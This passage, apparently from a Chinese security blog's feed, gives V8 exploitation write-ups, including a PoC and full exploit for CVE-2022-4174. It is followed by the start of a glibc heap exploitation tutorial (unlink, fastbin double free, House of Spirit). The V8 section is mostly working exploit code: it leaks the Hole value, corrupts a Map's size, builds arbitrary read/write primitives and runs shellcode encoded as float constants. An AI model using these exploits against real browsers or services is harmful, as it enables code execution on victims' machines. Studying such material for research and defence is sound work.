class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">get_hole</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">13</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">21</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">21</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">21</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">21</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_offset = <span class="title function_">offset_of</span>(shellcode);</span><br><span class="line"><span class="keyword">var</span> leak_offset = (<span class="title function_">read</span>(shellcode_offset + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>) + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> leak_data = <span class="title function_">read</span>(leak_offset);</span><br><span class="line"><span class="keyword">var</span> code = leak_data &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"><span class="keyword">var</span> code_entry_point = leak_data &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(leak_offset, (code &lt;&lt; <span class="number">32n</span>) | (code_entry_point + <span class="number">0x68n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] leak offset: &quot;</span> + <span class="title function_">hex</span>(leak_offset));</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="CVE-2022-4174"><a href="#CVE-2022-4174" class="headerlink" title="CVE-2022-4174"></a>CVE-2022-4174</h2><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2022-4174" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>环境搭建如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 9.7.106.19</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<p>数组 <code>errors</code> 长度总是设置比所需长度长，而多出来的那个部分的值设为 <code>Hole</code> 。这个数组泄露给用户也就把 <code>Hole</code> 泄露给用户。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 9. Set errors[index] to x.</span></span><br><span class="line"><span class="type">const</span> newCapacity = <span class="built_in">IntPtrMax</span>(<span class="built_in">SmiUntag</span>(remainingElementsCount), index + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (newCapacity &gt; errors.length_intptr) deferred &#123;</span><br><span class="line">    errors = <span class="built_in">ExtractFixedArray</span>(errors, <span class="number">0</span>, errors.length_intptr, newCapacity);</span><br><span class="line">    *<span class="built_in">ContextSlot</span>(</span><br><span class="line">        context,</span><br><span class="line">        PromiseAnyRejectElementContextSlots::</span><br><span class="line">            kPromiseAnyRejectElementErrorsSlot) = errors;</span><br><span class="line">  &#125;</span><br><span class="line">errors.objects[index] = value;</span><br></pre></td></tr></table></figure></div>
<p>因此有如下 poc：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v1;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f0</span>(<span class="params">v4</span>) &#123;</span><br><span class="line">        <span class="title function_">v4</span>(<span class="function">() =&gt;</span> &#123; &#125;, <span class="function"><span class="params">v5</span> =&gt;</span> &#123; v1 = v5.<span class="property">errors</span>; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    f0.<span class="property">resolve</span> = <span class="function">(<span class="params">v6</span>) =&gt;</span> &#123; <span class="keyword">return</span> v6; &#125;;</span><br><span class="line">    <span class="keyword">let</span> v3 = &#123;</span><br><span class="line">        <span class="title function_">then</span>(<span class="params">v7, v8</span>) &#123;</span><br><span class="line">            <span class="title function_">v8</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="property">any</span>.<span class="title function_">call</span>(f0, [v3]);</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该 POC 的过程为：</p>
<ul>
<li>通过调用 <code>Promise.any.call(f0, [v3])</code> ，使用 <code>Promise.any</code> 方法来执行异步操作。</li>
<li>执行函数 <code>f0</code> ，参数为 <code>v4</code> 类型未知。</li>
<li>执行 <code>f0.resolve</code> 函数，参数 <code>v6</code> 即 <code>v3</code> 。</li>
<li>执行 <code>then</code> 函数，<code>then</code> 函数第一个参数为 <code>v4</code> 第一个参数，第二个参数未知，但随即会调用 <code>v5</code> 函数。</li>
<li>执行 <code>v5</code> 函数，取出 <code>v5</code> 的 <code>errors</code> 数组赋值给变量 <code>v1</code> 。</li>
</ul>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v1;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f0</span>(<span class="params">v4</span>) &#123;</span><br><span class="line">        <span class="title function_">v4</span>(<span class="function">() =&gt;</span> &#123; &#125;, <span class="function"><span class="params">v5</span> =&gt;</span> &#123; v1 = v5.<span class="property">errors</span>; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    f0.<span class="property">resolve</span> = <span class="function">(<span class="params">v6</span>) =&gt;</span> &#123; <span class="keyword">return</span> v6; &#125;;</span><br><span class="line">    <span class="keyword">let</span> v3 = &#123;</span><br><span class="line">        <span class="title function_">then</span>(<span class="params">v7, v8</span>) &#123;</span><br><span class="line">            <span class="title function_">v8</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="property">any</span>.<span class="title function_">call</span>(f0, [v3]);</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x16</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<p>该漏洞修复<a class="link"   href="https://chromium.googlesource.com/v8/v8/+/8b35091b2d244c975975e1c78e4cd09cb479b5dc%5E!/#F0" >补丁 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>如下：</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/promise-any.tq b/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="comment">index ffb285a..7e707e6 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="meta">@@ -119,7 +119,19 @@</span></span><br><span class="line">           kPromiseAnyRejectElementRemainingSlot);</span><br><span class="line"> </span><br><span class="line">   // 9. Set errors[index] to x.</span><br><span class="line"><span class="deletion">-  const newCapacity = IntPtrMax(SmiUntag(remainingElementsCount), index + 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // The max computation below is an optimization to avoid excessive allocations</span></span><br><span class="line"><span class="addition">+  // in the case of input promises being asynchronously rejected in ascending</span></span><br><span class="line"><span class="addition">+  // index order.</span></span><br><span class="line"><span class="addition">+  //</span></span><br><span class="line"><span class="addition">+  // Note that subtracting 1 from remainingElementsCount is intentional. The</span></span><br><span class="line"><span class="addition">+  // value of remainingElementsCount is 1 larger than the actual value during</span></span><br><span class="line"><span class="addition">+  // iteration. So in the case of synchronous rejection, newCapacity is the</span></span><br><span class="line"><span class="addition">+  // correct size by subtracting 1. In the case of asynchronous rejection this</span></span><br><span class="line"><span class="addition">+  // is 1 smaller than the correct size, but is not incorrect as it is maxed</span></span><br><span class="line"><span class="addition">+  // with index + 1.</span></span><br><span class="line"><span class="addition">+  const newCapacity =</span></span><br><span class="line"><span class="addition">+      IntPtrMax(SmiUntag(remainingElementsCount) - 1, index + 1);</span></span><br><span class="line">   if (newCapacity &gt; errors.length_intptr) deferred &#123;</span><br><span class="line">       errors = ExtractFixedArray(errors, 0, errors.length_intptr, newCapacity);</span><br><span class="line">       *ContextSlot(</span><br><span class="line"><span class="meta">@@ -306,6 +318,7 @@</span></span><br><span class="line">           PromiseAnyRejectElementContextSlots::</span><br><span class="line">               kPromiseAnyRejectElementErrorsSlot);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+      check(errors.length == index - 1);</span></span><br><span class="line">       const error = ConstructAggregateError(errors);</span><br><span class="line">       // 3. Return ThrowCompletion(error).</span><br><span class="line">       goto Reject(error);</span><br></pre></td></tr></table></figure></div>]]></content>
  </entry>
  <entry>
    <title>linux 堆利用</title>
    <url>/2024/11/08/linux-heap-exploit/</url>
    <content><![CDATA[<p><a class="link"   href="https://gitcode.net/qq_45323960/debug_glibc" >debug glibc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：对于一些复杂的堆利用，可以先用支持源码调试的 libc 完成利用，然后改偏移打题目提供的 libc 。</p>
<h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><p>假设正常情况下，每申请一个 chunk 会保存一个指向该 chunk 内存块的指针。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c24de3948290c69cc25a42ce707dee0e.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ><br>在 chunk1 伪造 fake chunk ，需要注意：</p>
<ol>
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                 </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>

<p>令：</p>
<ul>
<li><code>fakeFD -&gt; bk == P1</code> &lt;&#x3D;&gt; <code>*(&amp;fakeFD + 0x18) == P1</code> &lt;&#x3D;&gt; <code>*fakeFD == &amp;P1 - 0x18</code></li>
<li><code>fakeBK -&gt; fd == P1</code> &lt;&#x3D;&gt; <code>*(&amp;fakeBK + 0x10) == P1</code> &lt;&#x3D;&gt; <code>*fakeBK == &amp;P1 - 0x10</code></li>
</ul>
</li>
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))   </span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);  </span><br></pre></td></tr></table></figure></div>

<p>要将 chunk2 的 prev_size 修改成 fake chunk 的 size。</p>
</li>
<li><p>为了绕过</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(P)) &amp;&amp;                                 </span><br><span class="line">    __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                             </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) ||               </span><br><span class="line">        __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))                 </span><br><span class="line">        <span class="built_in">malloc_printerr</span>(check_action, <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure></div>

<p>fake chunk 大小应在 small bin 范围。</p>
</li>
<li><p>为了能使得 chunk2 与 fake chunk 合并，chunk2 的 size 的 PREV_INUSE 位 为 0 ，且 chunk2 的大小不能在 fast bin 范围。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/31ad53b15d70e22f7ec4125df5450793.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>释放 chunk2 ，向前合并 fake chunk ，使得 fake chunk 进行 unlink 操作，按如下代码执行，因此 <code>P1 = &amp;P1 - 0x18</code> 。	</p>
<ul>
<li><code>FD-&gt;bk = BK</code> &lt;&#x3D;&gt; <code>P1 = &amp;P1 - 0x10</code></li>
<li><code>BK-&gt;fd = FD</code> &lt;&#x3D;&gt; <code>P1 = &amp;P1 - 0x18</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/7d5c7910c99de4ad253ff5e77e667dea.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
</li>
</ol>
<p>至此，整个指针数组被控制，可以实现任意地址读写。</p>
<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><ul>
<li><p>先释放 chunk1，如果此时再次释放 chunk1 会触发对 double free 的检查：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于只检查链表中第一个 chunk 是否是待释放的 chunk ，因此可以通过先释放 chunk2 再释放 chunk1 绕过。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d9da022304748498ca33674ba391ec2.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
</li>
<li><p>此时 malloc 获取 chunk1 等价于 UAF 漏洞。可以修改 chunk1 的 fd 指针指向特定地址，这样就可以在特定位置申请 chunk 。不过值得注意的是，由于存在如下检查，要保证申请 chunk 位置对应的 size 字段的值是正确的。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(<span class="built_in">fastbin_index</span>(<span class="built_in">chunksize</span>(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(check_action, errstr, <span class="built_in">chunk2mem</span>(victim));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>如下图所示，在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/928b3c5c57f4eb0192446216d5e1e16c.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ><br>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 <code>ISMMAP</code> 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">        mp_.mmap_threshold = chunksize(p);</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">        LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                   mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">ar_ptr = arena_for_chunk(p);</span><br><span class="line">_int_free(ar_ptr, p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div></li>
